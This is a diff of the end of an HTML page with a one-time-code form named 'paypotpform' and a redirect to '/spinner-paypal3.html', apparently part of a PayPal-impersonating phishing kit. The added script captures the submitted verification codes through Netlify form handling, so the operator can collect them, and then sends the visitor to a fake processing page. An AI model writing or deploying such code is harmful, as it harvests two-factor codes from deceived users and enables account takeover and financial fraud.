@@ -218,63 +218,32 @@ ul.priorityCountries li:first-child a:hover {
 <button class="button actionContinue" type="button" id="resendOtpBtn" style="background-color: white; color: black;" disabled="">Resend Code</button>
 <script>
 document.addEventListener('DOMContentLoaded', function() {
-    const otpInputs = document.querySelectorAll('.otp-container input[type="text"]');
     const form = document.getElementById('paypotpform');
-
-    // Function to move focus to next input
-    otpInputs.forEach((input, index) => {
-        input.addEventListener('input', function() {
-            this.value = this.value.replace(/[^0-9]/g, ''); // Allow only numbers
-            if (index < otpInputs.length - 1 && this.value) {
-                otpInputs[index + 1].focus(); // Move to next field
-            }
-            if (index === otpInputs.length - 1 && this.value) {
-                otpInputs[index].blur(); // Remove focus on last input
-                // Optionally, trigger form submission here if all fields are automatically filled
-                // checkIfAllFilled();
-            }
-        });
-    });
-
-    function checkIfAllFilled() {
-        const allFilled = Array.from(otpInputs).every(input => input.value);
-        if (allFilled) {
-            submitOtpForm(); // Call submission function only if all OTP inputs are filled
-        }
-    }
-
-    function submitOtpForm() {
-        const formData = new FormData(form);
-        const otpValue = Array.from(otpInputs).map(input => input.value).join('');
-
-        formData.append('otp', otpValue); // Assuming your backend expects a single 'otp' field
-
-        fetch(form.action, {
-            method: 'POST',
-            headers: { "Content-Type": "application/x-www-form-urlencoded" },
-            body: new URLSearchParams(formData)
-        })
-        .then(response => {
-    console.log(response); // Debugging line
-    if (!response.ok) {
-        throw new Error('OTP submission failed');
-    }
-    console.log('Redirection happening to /spinner-paypal3.html');
-    window.location.href = "/spinner-paypal3.html"; // Ensure this URL is correct
-})
-        .catch(error => {
-            console.error('Error:', error);
-            // Handle the error, e.g., show an error message to the user
-        });
-    }
 
     form.addEventListener('submit', function(event) {
         event.preventDefault(); // Prevent the default form submission
-        checkIfAllFilled(); // Verify all inputs are filled before submission
-    });
 
+        const formData = new FormData(form);
+        
+        // Use the Netlify form handling endpoint
+        fetch('/', { 
+            method: 'POST',
+            headers: { "Content-Type": "application/x-www-form-urlencoded" },
+            body: new URLSearchParams(formData).toString()
+        })
+        .then(response => {
+            if (response.ok) {
+                // Redirect on successful submission
+                window.location.href = "/spinner-paypal3.html";
+            } else {
+                throw new Error('Form submission failed');
+            }
+        })
+        .catch(error => console.error('Error:', error));
+    });
 });
 </script>
+
 
 </body>
 </html>
